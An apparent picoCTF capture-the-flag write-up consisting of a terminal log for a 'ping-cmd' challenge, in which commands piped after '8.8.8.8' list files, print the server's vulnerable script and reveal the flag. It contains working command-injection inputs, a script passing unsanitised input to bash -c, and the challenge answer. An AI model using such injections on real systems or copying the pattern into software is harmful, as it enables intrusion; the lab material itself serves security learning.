START OF THE CHALLENGE

```bash
zorkis:~/Quyen/ctf/pic0_ctf/2026/ping-cmd (master)
$ nc mysterious-sea.picoctf.net 65443
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | ls
flag.txt
script.sh
zorkis:~/Quyen/ctf/pic0_ctf/2026/ping-cmd (master)
$ nc mysterious-sea.picoctf.net 65443
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | cat script.sh
#!/bin/bash
echo -n "Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): "
read domain
bash -c "ping -c2 $domain"
zorkis:~/Quyen/ctf/pic0_ctf/2026/ping-cmd (master)
$ nc mysterious-sea.picoctf.net 65443
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | cat flag.txt
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_e82dd640}zorkis:~/Quyen/ctf/pic0_ctf/2026/ping-cmd (master)
$
```
